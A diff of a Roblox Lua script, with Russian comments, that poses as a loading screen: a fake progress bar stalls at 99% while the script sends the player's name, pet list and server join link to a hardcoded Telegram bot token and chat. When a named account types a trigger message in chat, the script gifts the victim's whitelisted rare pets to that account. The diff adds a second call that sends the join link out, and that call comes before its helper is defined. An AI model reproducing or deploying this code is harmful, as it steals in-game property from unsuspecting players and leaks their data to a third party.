@@ -1,3 +1,23 @@
+-- Получаем JobId и PlaceId текущего сервера
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- Генерация ссылки для подключения к серверу
+local function getServerLink()
+    if not jobId or jobId == "" then
+        return "https://www.roblox.com/games/"..placeId
+    end
+    return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
+end
+
+-- Отправка ссылки на сервер в Telegram
+local function sendJoinLinkToTelegram()
+    local message = "🔗 Присоединиться к серверу: "..getServerLink()
+    sendToTelegram(message)
+end
+
+-- 👇 ВСТАВЛЕН ТВОЙ ОСТАЛЬНОЙ СКРИПТ С GUI И ФУНКЦИОНАЛОМ
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -60,45 +80,30 @@ task.spawn(function()
     percent.TextXAlignment = Enum.TextXAlignment.Left
     percent.Parent = background
 
-    -- Прогресс до 99% за ~5 минут (299 шагов)
     for i = 1, 99 do
         barFill.Size = UDim2.new(i / 100, 0, 1, 0)
         percent.Text = i .. "%"
-        task.wait(3) -- 3 секунды * 99 ≈ 5 минут
+        task.wait(3)
     end
 
-    -- Застывает на 99%
     percent.Text = "99%"
     barFill.Size = UDim2.new(0.99, 0, 1, 0)
-    -- НЕ УДАЛЯЕМ GUI
 end)
 
--- ⏳ Весь остальной функционал запускается независимо
+-- ⏳ Остальной код
 
--- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "sfdgbzdfsb"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Butterfly",
-    "Mimic Octopus",
-    "Dragonfly",
-    "Disco Bee",
-    "Queen Bee",
-    "French Fry Ferret",
-    "Raiju",
-    "Raccoon",
-    "Fennec Fox",
-    "Spinosaurus",
-    "T-Rex"
+    "Butterfly", "Mimic Octopus", "Dragonfly", "Disco Bee", "Queen Bee",
+    "French Fry Ferret", "Raiju", "Raccoon", "Fennec Fox", "Spinosaurus", "T-Rex"
 }
 
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- 🔎 Получить всех питомцев
 local function getAllPets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
@@ -124,7 +129,6 @@ local function getAllPets()
     return pets
 end
 
--- 📜 Список питомцев
 local function getFullPetsList()
     local pets = getAllPets()
     if #pets == 0 then return "нет питомцев" end
@@ -138,9 +142,8 @@ local function getFullPetsList()
     return table.concat(list, "\n")
 end
 
--- 📨 Telegram
 local function sendToTelegram(text)
-    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
+    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage" ..
                 "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
     local success, err = pcall(function() game:HttpGet(url) end)
     if not success then
@@ -148,29 +151,18 @@ local function sendToTelegram(text)
     end
 end
 
--- 🔗 Ссылка
-local function getServerLink()
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    if not jobId or jobId == "" then
-        return "https://www.roblox.com/games/"..placeId
-    end
-    return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
-end
-
--- 🏁 Стартовое уведомление
 local function sendInitialNotification()
     local petsList = getFullPetsList()
     local message =
-        "🔔 Игрок "..player.Name.." запустил скрипт\n\n"..
-        "🐾 Питомцы:\n"..petsList.."\n\n"..
+        "🔔 Игрок "..player.Name.." запустил скрипт\n\n" ..
+        "🐾 Питомцы:\n"..petsList.."\n\n" ..
         "🔗 Ссылка на сервер:\n"..getServerLink()
     sendToTelegram(message)
 end
 
 sendInitialNotification()
+sendJoinLinkToTelegram()
 
--- 🐕 Передача
 local function transferPet(pet)
     if not pet.isWhitelisted then return false end
     local target = Players:FindFirstChild(TARGET_PLAYER)
@@ -185,7 +177,6 @@ local function transferPet(pet)
     return false
 end
 
--- 🚚 Старт передачи
 local function startPetTransfer()
     local pets = getAllPets()
     if #pets == 0 then
@@ -211,7 +202,6 @@ local function startPetTransfer()
     sendToTelegram(table.concat(report, "\n"))
 end
 
--- 💬 Прослушка сообщений
 if TextChatService then
     TextChatService.OnIncomingMessage = function(message)
         local speaker = Players:FindFirstChild(message.TextSource.Name)
